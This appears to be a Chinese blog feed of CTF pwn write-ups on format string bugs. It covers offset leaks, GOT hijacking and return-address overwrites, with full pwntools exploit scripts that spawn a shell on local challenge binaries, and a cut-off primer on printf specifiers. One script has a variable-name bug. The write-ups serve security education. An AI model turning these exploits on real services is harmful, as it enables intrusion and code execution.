    <content type="html"><![CDATA[<p>习题和一些解题技巧</p><span id="more"></span><h1 id="64-位程序格式化字符串漏洞"><a href="#64-位程序格式化字符串漏洞" class="headerlink" title="64 位程序格式化字符串漏洞"></a>64 位程序格式化字符串漏洞</h1><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>之前学习基础的时候我们都把程序编译成32位，64位的漏洞原理也是相似的，只不过还是传参方式上的细微差别。虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。</p><h4 id="🌰："><a href="#🌰：" class="headerlink" title="🌰："></a>🌰：</h4><p>题目在这里：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">pwn200 GoodLuck</a> </p><blockquote><p>这道题目的原题里有获取本地flag.txt文件的代码部分，我们要本地复现的话需要自己新建一个flag.txt文件</p></blockquote><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/goodluck_run.png"></p><p>看看源代码，主要逻辑就是先获取flag内容放在v10里，获取用户输入进行对比，如果用户输入的flag正确，则输出flag，也就是说我们要让 <code>v10[j]=v4</code> 。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/goodluck_main.png"></p><p>我们可以看出这是一个格式化字符串漏洞。根据格式化字符串解题的步骤，我们首先确定格式化字符串变量的偏移位置。</p><p>在printf处下断点，注意我们要输出的是题目的flag，所以获取的是题目flag的偏移。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/gdb_padding.png"></p><p>我们可以看出相对应的 flag 是栈上的第四个变量，除此之外，64位的程序前六个变量储存在寄存器中，而 fmt 字符串又在 rdi 上，所以 flag 相对于 fmt 字符串的偏移就是（剩余的五个寄存器+4）&#x3D;9。</p><p>或者也可以利用工具比如 pwndbg ，有一条 <code>fmtarg [目标地址]</code> 的指令可以直接输出偏移。注意要把断点断在printf。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/goodkuck_pwndbg.png"></p><p>最终的exp为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;%9$s&#x27;</span><br>p.sendline(payload)<br><span class="hljs-built_in">print</span> p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure><p>甚至本地复现都不用exp（x</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/goodluck_exp.png"></p><p><del>(三个问号是因为我偷懒设置的本地flag和题目原本的flag长度不一样)</del></p><h1 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h1><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>当前ELF编译系统使用延迟绑定的技术来实现对共享库的调用过程，主要由GOT表和PLT表实现。</p><p>原理大致为 : 当目标模块存在一个外部共享库的函数调用时，在汇编层面使用 call 指令实现调用，其作用为跳转至对应函数的 PLT 表项处执行，该表项的第一条指令为 jmp *[ 对应 GOT 项的地址 ]，第一次执行函数调用时，通过 GOT 与 PLT 的合作，会将最终调用函数的地址确定下来，并存放在其对应的 GOT 表项中。当后续再发生调用时， jmp *[ 对应 GOT 项的地址 ] 指令即表示直接跳转至目标函数处执行。</p><p>在C程序中，libc函数都是通过GOT表跳转的。同时，如果程序没有开启RELRO保护，那么每个LIBC函数对应的GOT表项是可以被修改的。我们就可以借此修改某一个函数的GOT表地址为另一个函数，从而进行目标函数的调用。</p><p>假设我们需要将函数A的地址覆盖为函数B的地址，步骤为：</p><ul><li>确定 A 的 GOT 表地址</li><li>确定 B 的地址</li><li>将B的地址写入 A 对应的 GOT 表处</li></ul><h4 id="🌰：-1"><a href="#🌰：-1" class="headerlink" title="🌰："></a>🌰：</h4><p>题目在这里： <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3">2016 CCTF 中的 pwn3</a> </p><h5 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h5><p>查看保护</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_checksec.png"></p><p>查看一下源码逻辑</p><p>首先在main函数中的 <code>ask_username() </code>函数中有一个 scanf 函数，并通过循环将输入值的ASCII码值加一赋值给 dest，也就是主函数中的s1。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_askname.png"></p><p>注意 <code>ask_password</code> 部分的判断条件，也就是我们最开始的输入要求是 <code>&quot;sysbdmin&quot;</code> 对应的每一字母的ASCII码值减一。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_askpassword.png"></p><p>可以在payload里写一个如下的函数： <del>（最后结果是 rxraclhm</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">password</span>():<br>    admin=<span class="hljs-string">&#x27;sysbdmin&#x27;</span><br>    name=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> admin:<br>        name+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>进入程序主循环后，查看每个函数的功能，三个函数对应模拟 FTP 的操作。没有地方可以栈溢出，要按照程序的逻辑一步一步进行。</p><p><code>put_file()</code> 函数：</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_putfile.png"></p><p>由于 <code>file_head</code> 变量位于 BSS 段上，是全局变量。每次调用 <code>put_file()</code> 函数时，当前 <code>file_head</code> 存储的地址都是上一次分配的地址，赋值给 <code>v0[60]</code>，调用即将结束时会将本次的地址赋值给 <code>file_head</code> ，将会在下一次调用函数时赋值给对应的变量。如此就在栈上形成链表关系，可以通过遍历链表来访问之前保存的文件信息。</p><p><code>show_dir()</code> ：</p><p>读取 <code>put_file() </code>中形成的链表的内容也就是文件的名称并存储在 s 中，最后调用 <code>puts()</code> 输出 s。</p><p> <code>get_file()</code> 函数:</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_getfile.png"></p><p>有 <code>printf(dest)</code> 没有加格式化字符串，可以任意写和读。</p><p>需要注意的是我们不能控制程序跳转到 <code>get_file()</code> 再直接 get flag，<del>那样不高级</del> 程序设置检查输入“ flag ”会返回输出警告。</p><blockquote><p>做题原则：没有一个函数是多余的🤨</p></blockquote><h5 id="漏洞利用思路："><a href="#漏洞利用思路：" class="headerlink" title="漏洞利用思路："></a>漏洞利用思路：</h5><ul><li>绕过最开始的检查密码。</li><li>利用 <code>printf()</code> 获取 puts 的 GOT 地址，进而获得 system 函数的地址。</li><li>利用 <code>printf()</code> 修改 puts 的 GOT 表地址为 system 函数的地址。</li><li>将<code>show_dir()</code> 函数中 <code>puts()</code> 的参数也就是读取的文件信息改为” bin&#x2F;sh “。</li></ul><p>首先确定格式化字符串变量对应的偏移</p><p>找到 printf 的地址下断点用 gdb 调试一下，不要直接 <code>b printf</code>，那样会在每个 printf 都停一次，效率低低哒🤪<br><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_printf_addr.png"></p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_printf_stack.png"></p><p>可以看出是第七个参数。知道了参数的偏移就可以利用 printf 输出 put 的地址和修改 put 的 GOT 表地址啦。</p><p>在这里我们可以用到 pwntools 中的 fmtstr_payload 函数，函数返回一个完整的 payload。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fmtstr<span class="hljs-constructor">_payload(<span class="hljs-params">offset</span>, <span class="hljs-params">writes</span>, <span class="hljs-params">numbwritten</span>=0, <span class="hljs-params">write_size</span>=&#x27;<span class="hljs-params">byte</span>&#x27;)</span><br></code></pre></td></tr></table></figure><ul><li>offset：对应格式化字符串的偏移</li><li>writes：需要利用%n写入的数据，采用字典形式。比如我们要将 printf 的 GOT 数据改为 system 函数地址，就写成 <code>&#123;printfGOT: systemAddress&#125;</code></li><li>numbwritten：已经输出的字符个数，默认值为0，也可另附值</li><li>write_size：写入方式，分类有字节（byte）、双字节（short）和四字节（int），对应着 hhn、hn 和 n，默认值是byte。</li></ul><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br>sh=process(<span class="hljs-string">&#x27;./pwn3&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn3&#x27;</span>)<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>admin=<span class="hljs-string">&#x27;sysbdmin&#x27;</span><br>name=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> admin:<br>name+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>)   <span class="hljs-comment">#绕过密码检查登，陆密码rxraclhm</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Name (ftp.hacker.server:Rainism):&#x27;</span>)<br>sh.sendline(name)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;ftp&gt;&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;put&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;please enter the name of the file you want to upload:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;filename1&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;then, enter the content:&#x27;</span>)<br>show_puts_payload=p32(puts_got)+<span class="hljs-string">&#x27;%7$s&#x27;</span>     <span class="hljs-comment">#通过get泄露puts函数地址</span><br>sh.sendline(show_puts_payload)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;ftp&gt;&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;get&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;enter the file name you want to get:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;filename1&#x27;</span>)<br>puts_addr = u32(sh.recv()[:<span class="hljs-number">4</span>])   <span class="hljs-comment">#获得puts的实际地址</span><br><br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br>system_offset = libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>puts_offset = libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = puts_addr - puts_offset + system_offset    <span class="hljs-comment">#获得system的实际地址</span><br><br>payload = fmtstr_payload(<span class="hljs-number">7</span>, &#123;puts_got: sys_addr&#125;)<br>sh.sendline(<span class="hljs-string">&#x27;put&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;please enter the name of the file you want to upload:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh;&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;then, enter the content:&#x27;</span>)<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&#x27;ftp&gt;&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;get&#x27;</span>)    <span class="hljs-comment">#读取文件内容并执行printf进行地址覆盖</span><br>sh.recvuntil(<span class="hljs-string">&#x27;enter the file name you want to get:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh;&#x27;</span>)<br><br>sh.sendline(<span class="hljs-string">&#x27;dir&#x27;</span>)   <span class="hljs-comment">#调用puts读取文件名实际执行system(&#x27;bin/sh;&#x27;)</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h1><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。</p><p>🌰：</p><p> 题目在这里：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme_k0">三个白帽 - pwnme_k0</a> </p><h5 id="分析题目-1"><a href="#分析题目-1" class="headerlink" title="分析题目"></a>分析题目</h5><p>检查保护：</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwnme_checksec.png"></p><p>程序实现了一个登录的功能，可以查看和修改信息。玩了一下发现没有存储功能，修改了账号密码以后它就会覆盖新的数据，不会保留原来的数据。</p><p>看一下源码</p><p>把文件拖进ida就发现程序里留有后门函数，在 <code>sub_4008A6()</code> 函数中直接<code>return system(&quot;/bin/sh&quot;)</code>。我们可以控制程序跳转到这个地方。函数地址是 <code>0x4008AA</code></p><p>在 <code>sub_400B07</code> 函数，也就是主循环中对应的选项 <code>1.Sh0w Account Information</code> 中有 <code>printf()</code> 函数没有格式化字符串，似乎有漏洞可以利用。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwnme_printf.png"></p><p>根据函数间变量的对应关系回溯一下程序其他的函数部分，发现在当初读入的时候就是以这个形式读入的（修改账号密码时读入也是这个形式）</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwnme_input.png"></p><h5 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h5><ul><li><p>获取system执行时的地址</p></li><li><p>获取函数返回地址，利用 printf 修改返回地址为 system 后门函数地址</p></li><li><p>利用密码输入将payload写入</p></li></ul><p>首先确定一下偏移，断点下在第二个 printf 的地方。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwnme_stack.png"></p><p>可以看出输入的用户名在栈上的第三个位置，格式化字符串本身又在rdi上，所以偏移就是 6 + 3 - 1 &#x3D; 8。</p><p>同时栈上，第一个元素存储的是上一个函数的 rbp 也就是接下来所说的旧返回地址。栈上第二个位置存储的就是当前函数的返回地址，在格式化字符串中的偏移为 7，相对于旧返回地址的偏移为 0x7fffffffdd70 - 0x7fffffffdd38 &#x3D; 0x38。</p><p>返回地址 <code>0x400d74</code> 和目标地址 <code>0x4008AA</code>只有低字节不同，我们可以只修改低2字节 ，即：写成 <code>0x08AA = 2218</code>。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.arch=<span class="hljs-string">&quot;amd64&quot;</span><br><br>sh=process(<span class="hljs-string">&#x27;./pwnme_k0&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwnme_k0&#x27;</span>)<br><br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;modifier&quot;</span>)<br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;%6$p&quot;</span>)<br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>ret_addr = <span class="hljs-built_in">int</span>(sh.recvline().strip(),<span class="hljs-number">16</span>) - <span class="hljs-number">0x38</span><br><br>sh.recv()<br>sh.writeline(<span class="hljs-string">&quot;2&quot;</span>)<br>sh.recv()<br>sh.sendline(p64(ret_addr))<br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;%2218d%8$hn&quot;</span>)<br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>sh.recv()<br>sh.interactive()<br></code></pre></td></tr></table></figure><hr><p><strong>奇怪踩坑之我把chatGPT玩崩了</strong></p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/Snipaste_2023-07-11_22-10-00.png"></p><p>问题发生在我问了 chatGPT 一个弱智问题后，它说我输入了可疑信息。😨</p><p>最后我去找了机器人客服申诉，今天把我从小黑屋放出来了。</p><p>我做错了什么我就是笨笨而已为什么把我关小黑屋😿</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>格式化字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串</title>
    <link href="/2023/07/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <url>/2023/07/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<p>传说中的Format String 泄露任意地址和覆盖任意地址</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h3><p>格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式，格式化字符串函数可以接受可变数量的参数，并将其第一个参数作为格式化字符串函数。像是 <code>printf(&#39;My name is %s&#39;,&#39;Modifier&#39;)</code> ，<code>printf()</code> 就是格式化字符串函数。</p><h4 id="常见的格式化字符串函数"><a href="#常见的格式化字符串函数" class="headerlink" title="常见的格式化字符串函数"></a>常见的格式化字符串函数</h4><h5 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h5><ul><li>scanf</li></ul><h5 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h5><ul><li>printf    输出到stdout</li><li>fprintf    输出到FILE流</li><li>vprntf    根据参数列表格式化输出到stdout</li><li>vfprintf    根据参数列表格式化输出到指定 FILE 流</li><li>sprintf    输出到字符串</li><li>snprintf   输出指定字节数到字符串</li><li>vsprintf    根据参数列表格式化输出到字符串</li><li>vsnprintf    根据参数列表格式化输出指定字节到字符串</li><li>setproctitle    设置 argv</li><li>syslog    输出日志</li></ul><h4 id="格式化字符串的格式"><a href="#格式化字符串的格式" class="headerlink" title="格式化字符串的格式"></a>格式化字符串的格式</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">%<span class="hljs-selector-attr">[parameter]</span><span class="hljs-selector-attr">[flags]</span><span class="hljs-selector-attr">[field width]</span><span class="hljs-selector-attr">[.precision]</span><span class="hljs-selector-attr">[length]</span>type<br></code></pre></td></tr></table></figure><ul><li><strong>Parameter</strong> - 可省略</li></ul><p>表示为<code>n$</code>，这个格式说明符用于说明显示第几个参数。这使得同一个参数可以以不同的顺序被输出多次。需要注意的是，如果任意一个占位符使用了parameter，那么所有的占位符都必须使用parameter。</p><p>eg：<code>printf(&quot;%2$d ,%1$d&quot;,16,17)</code> 输出结果为<code>17，16</code></p><ul><li><strong>Flags</strong> - 可以为0或者多个</li></ul><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>+</td><td>仅用于数值类型。用于表示有符号数值的 <code>+</code> 或 <code>-</code> 号，缺省情况时省略正数的符号。</td></tr><tr><td>空格</td><td>作用于有符号数的输出，如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与’+’同时出现，则空格说明符被忽略。</td></tr><tr><td>-</td><td>左对齐。缺省情况是右对齐。</td></tr><tr><td>#</td><td>对于 <code>g</code> 与 <code>G</code> ，不删除尾部0以表示精度。对于 <code>f</code> , <code> F</code> ,  <code>e</code> ,  <code>E</code> ,  <code>g</code> ,  <code>G</code> , 总是输出小数点。对于 <code>o</code> ,  <code>x</code> ,  <code>X</code> , 在非0数值前分别输出前缀<code>0</code>, <code>0x</code>, and <code>0X</code>表示数制。</td></tr><tr><td>0</td><td>如果 width 选项前缀以0，则在左侧用0填充直至达到宽度要求。例如<code>printf(&quot;%2d&quot;, 3)</code>输出 <code> 3</code>，而<code>printf(&quot;%02d&quot;, 3)</code>输出 <code>03</code> 。如果<code>0</code>与<code>-</code>均出现，则<code>0</code>被忽略，即左对齐依然用空格填充。</td></tr></tbody></table><ul><li><strong>Field width</strong></li></ul><p>field width 即域宽，用于表示输出字符的最小宽度，常用于制表输出时填充固定宽度的表目。</p><p>如果实际输出内容宽度小于field width，则默认按照左对齐的标准进行填充；当实际输出内容宽度大于field width，不会截断而是原样输出。</p><p>如果域宽值为<code>*</code>，作为一个参数传递时则由对应的函数参数的值为当前域宽，例如 <code>printf(&quot;%*d&quot;,5,10)</code> ，参数<code>5</code>将传递给<code>*</code>作为这个输出的域宽。</p><p>需要注意，域宽没有负值且不能设置为0：前导的负值被解释为一个正数前导值和左对齐标志负号；前导0被解释为<code>flag</code>的0填充标志。</p><ul><li><strong>.Precision</strong></li></ul><p>Precision 是精度，在构造函数时不能忘记前缀 <code>.</code> 。precision 通常指输出的最大长度，其不同的含义依赖于具体的不同的格式化类型：</p><p>对于 <code>d</code>、<code>i</code>、<code>u</code>、<code>x</code>、<code>o</code> 的整型数值是指最小的数字位数，不足的位要在左侧补0，如果超过也不截断，缺省值为1。</p><p>对于 <code>a/A</code>、<code>e/E</code>、<code>f/F</code> 的浮点型数值，是指小数点后显示的位数，必要时四舍五入或补0，缺省值为6。</p><p>对于 <code>s</code> 的字符串类型，是指输出的字节的上限，超出限制的其它字符将被截断。</p><p>需要注意的是，如果设置为<code>*</code>，则由对应的函数参数的值为当前精度值。例如 <code>printf(&quot;%.*s&quot;,3,&quot;abcde&quot;)</code> 的输出为 <code>abc</code> 。</p><ul><li><strong>Length</strong> - 可省略</li></ul><p>length 指输出的浮点型或者整型参数的长度，也被称为size。</p><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>hh</td><td>表示函数期望接收一个 char 类型的参数，并会将它提升为 int 类型。</td></tr><tr><td>h</td><td>表示函数期望接收一个 short 类型的参数，并会将它提升为 int 类型。</td></tr><tr><td>ll</td><td>表示函数接收一个 long long 类型的参数，并会把它转换为 int 类型。</td></tr><tr><td>l</td><td>表示函数接收一个 long 类型的参数，并会把它转换为 int 类型。</td></tr><tr><td>L</td><td>表示函数接收一个 long double 类型的参数，并会把它转换为 double 类型。</td></tr><tr><td>j</td><td>表示函数接收一个 intmax_t (带符号的最大宽度整型，其范围在不同的系统上可能有所变化) 类型的参数，并会把它转换为 int 类型。</td></tr><tr><td>t</td><td>表示函数接收一个 ptrdiff_t () 类型的参数，并会把它转换为 int 类型。</td></tr><tr><td>z</td><td>表示函数接收一个 size_t 类型的参数，并会把它转换为 int 类型。</td></tr></tbody></table><ul><li><strong>type</strong></li></ul><p>type就是类型转换符，可以具体如下：</p><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>d&#x2F;i</td><td><code>signed int</code> 。在输出时，<code>d</code> 和 <code>i</code> 同义，但在输入时有所不同。 <code>%i</code> 在输入值有前缀 <code>0x</code> 时，将数据转换为16进制；在有前缀 <code>0</code> 时，将数据转换为8进制。</td></tr><tr><td>u</td><td>十进制 <code>unsigned int</code>。</td></tr><tr><td>f&#x2F;F</td><td>固定小数点表示法表示的<code>double</code>，小数点后的位数由精度字段控制。<code>f </code>和 <code>F</code> 在输出无限大和NAN时打印出的字符串不同，<code>f</code> 为 <code>inf</code> 、 <code>infinity</code> 和 <code>nan</code> ， <code>F</code> 为 <code>INF</code> 、 <code>INFINITY</code> 和 <code>NAN</code> 。</td></tr><tr><td>e&#x2F;E</td><td>以科学计数法表示的<code>double</code>，指数部分使用小写字母 <code>e</code> 或 <code>E</code> 引入。指数至少包含两个数字，如果值为零，则指数为00。例如，<code>1.2345e+03</code>表示1.2345乘10的3次方。</td></tr><tr><td>g&#x2F;G</td><td>按照具体情况在固定小数点表示法和科学计数法之间选择合适的double。</td></tr><tr><td>x&#x2F;X</td><td>以十六进制数形式输出的 <code>signed int</code> 。x使用小写字母，X使用大写字母。</td></tr><tr><td>o</td><td>以八进制形式输出的 <code>signed int </code>。</td></tr><tr><td>s</td><td>以空字符结尾的字符串。</td></tr><tr><td>c</td><td>char（字符）。</td></tr><tr><td>p</td><td>void*（指向void的指针）以特定于实现的格式输出。<code>printf(&quot;%p&quot;,a)</code> 用地址的格式打印变量 a 的值，<code>printf(&quot;%p&quot;, &amp;a)</code> 打印变量 a 所在的地址。</td></tr><tr><td>a&#x2F;A</td><td>以十六进制表示法输出的<code>double</code>，以0x或0X开头。a使用小写字母，A使用大写字母。</td></tr><tr><td>n</td><td>不输出任何内容，但将到目前为止已写入的字符数写入整数指针参数。</td></tr></tbody></table><h3 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h3><p>我们知道，x86是通过栈来传递函数的参数的，举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %x %s&quot;</span>,<span class="hljs-string">&quot;hello Modifier\n&quot;</span>, <span class="hljs-number">0xcafebabe</span>, <span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看其执行printf时的栈结构如下（这里编译成64位的了，所以在gdb不会在栈中显示格式化字符串本身）</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/printf-stack.png"></p><p>实际栈中的结构从高到低依次是<code>&#39;\n&#39;指针 --&gt; 0xcafebabe --&gt; &#39;hello Modifier\n&#39;指针--&gt;格式化字符串指针</code></p><p>看上去一切正常，那么我们如何触发格式化字符串漏洞呢？</p><p>根据 cdecl 的调用约定，在进入 <code>printf ()</code> 